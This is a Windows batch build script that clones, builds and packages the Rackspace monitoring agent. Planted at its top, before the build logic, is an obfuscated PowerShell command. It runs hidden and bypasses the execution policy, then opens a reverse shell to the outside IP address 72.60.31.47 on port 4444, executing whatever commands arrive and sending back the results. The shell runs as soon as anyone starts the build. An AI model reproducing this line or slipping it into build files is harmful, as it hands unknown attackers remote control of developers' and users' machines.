echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('72.60.31.47',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

set LUVI_VERSION=v2.7.6-2-sigar
set LIT_VERSION=3.1.0
set RMA_VERSION=master

set LIT_URL="https://lit.luvit.io/packages/luvit/lit/v%LIT_VERSION%.zip"
set RMA_URL="https://github.com/virgo-agent-toolkit/rackspace-monitoring-agent"
set LUA_SIGAR_URL="https://github.com/virgo-agent-toolkit/lua-sigar.git "

set BUILD_DIR=%CD%\build
set SRC_DIR=%CD%\src

set LIT=%BUILD_DIR%\lit
set LUVI=%BUILD_DIR%\luvi

goto ParamLoop

:build
setlocal
mkdir %BUILD_DIR%
mkdir %SRC_DIR%
set PATH=%BUILD_DIR%:%PATH%

set RMA_DIR="%SRC_DIR%/rackspace-monitoring-agent"
if not exist %RMA_DIR% git clone --depth=1 --branch %RMA_VERSION% %RMA_URL% %RMA_DIR%
pushd %RMA_DIR%
call make.bat
call make.bat package
if not "%SKIP_UPLOAD%" == "true" (
  call make.bat packageupload
) else (
  echo "skipping upload"
)
popd
endlocal
goto :eof

:show_usage
setlocal
echo "Usage: build.bat [--force-version VERSION] [--skip-upload] [--help]"
endlocal
goto :eof


:ParamLoop
IF "%1"=="" GOTO ParamContinue
IF "%1"=="--help" (
  CALL :show_usage
  exit /b 1
)
IF "%1"=="--skip-upload" set SKIP_UPLOAD="true"
IF "%1"=="--force-version" (
  set FORCE_VERSION=%2
  ECHO "Forcing version: %2"
  SHIFT
)
SHIFT
GOTO ParamLoop
:ParamContinue


GOTO build
